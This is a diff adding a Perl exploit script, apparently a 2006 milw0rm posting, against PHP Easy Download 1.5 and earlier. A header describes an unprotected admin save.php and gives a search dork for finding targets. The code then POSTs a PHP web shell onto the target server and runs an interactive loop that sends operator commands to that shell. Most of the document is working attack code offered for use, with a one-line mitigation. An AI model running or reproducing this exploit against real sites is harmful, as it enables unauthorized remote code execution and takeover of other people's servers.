@@ -1,0 +1,102 @@
+#!/usr/bin/perl
+# +-------------------------------------------------------------------------------------------
+# + PHP Easy Download <= 1.5 Remote Code Execution Vulnerability
+# +-------------------------------------------------------------------------------------------
+# + Affected Software .: PHP Easy Download <= 1.5
+# + Vendor ............: http://www.ironclad.net/
+# + Download ..........: http://ironclad.net/scripts/PHP_Easy_Download.zip
+# + Description .......: "PHP Easy Download is an easy to use and convenient download script"
+# + Dork ..............: "PHP Easy Downloader"
+# + Class .............: Remote Code Execution
+# + Risk ..............: High (Remote Code Execution)
+# + Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
+# +-------------------------------------------------------------------------------------------
+# + Details:
+# + PHP Easy Download by default installation doesn't prevent any of the files in the
+# + file_info/admin directory from being accessed by a client. The file_info/admin/save.php
+# + file takes input passed to the script by $_POST and writes it to $_POST["filename"].0
+# + unsanatized in the file_info/admin/descriptions directory.
+# +
+# + Vulnerable Code: 
+# + file_info/admin/save.php, line(s) 14-36:
+# + -> 14: $filename = $_POST["filename"];
+# + -> 15: $description = $_POST["description"];
+# + -> 20: $path = "../descriptions/$filename.0";
+# + -> 30: $content = "$accesses|$description|$moreinfo|$date";
+# + -> 34: $newfile = fopen($path,"w");
+# + -> 35: fwrite($newfile, $content);
+# + -> 36: fclose($newfile);
+# + 
+# + Solution:
+# + Prevent users from accessing any of the files in the file_info directory (htaccess).
+# +-------------------------------------------------------------------------------------------
+
+use Getopt::Long;
+use URI::Escape;
+use IO::Socket;
+
+$code = "<?php passthru(\$_GET[cmd]); ?>";
+
+main();
+
+sub usage
+{
+    print "\nPHP Easy Download <= 1.5 Remote Code Execution Exploit\n";
+    print "-h, --host\ttarget host\t(example.com)\n";
+    print "-f, --file\tshell file\t(shell.php)\n";
+    print "-d, --dir\tinstall dir\t(/file_info)\n";
+    exit;
+}
+
+sub main
+{
+    GetOptions ('h|host=s' => \$host,'f|file=s' => \$file,'d|dir=s' => \$dir);
+    usage() unless $host;
+    
+    $dir = "/file_info" unless $dir;
+    $file = "shell.php" unless $file;
+    uri_escape($cmd);
+    $sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"80")
+     or die "\nconnect() failed.\n";
+    
+    print "\nconnected to ".$host.", sending data.\n";
+    $sendurl = "description=0&moreinfo=".$code."&accesses=0&filename=".$file."&date=&B1=Submit";
+    $sendlen = length($sendurl);
+    print $sock "POST ".$dir."/admin/save.php HTTP/1.1\n";
+    print $sock "Host: ".$host."\n";
+    print $sock "Connection: close\n";
+    print $sock "Content-Type: application/x-www-form-urlencoded\n";
+    print $sock "Content-Length: ".$sendlen."\n\n";
+    print $sock $sendurl;
+    print "attempted to create php shell, server response:\n\n";
+    while($recvd = <$sock>)
+    {
+        print " ".$recvd."";
+    }
+    
+    while($cmd !~ "~quit")
+    {
+        print "\n\n-> ";
+        $cmd = <STDIN>;
+        if ($cmd !~ "~quit")
+        {
+          $sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"80")
+           or die "connect() failed.\n";
+          $sendurl = uri_escape($cmd);
+          
+          print $sock "GET ".$dir."/descriptions/".$file.".0?cmd=".$sendurl." HTTP/1.1\n";
+          print $sock "Host: ".$host."\n";
+          print $sock "Accept: */*\n";
+          print $sock "Connection: close\n\n";
+          print "\n";
+          
+          while($recvd = <$sock>)
+          {
+              print $recvd;
+          }
+        }
+    }
+    exit;
+}
+
+# milw0rm.com [2006-11-18]
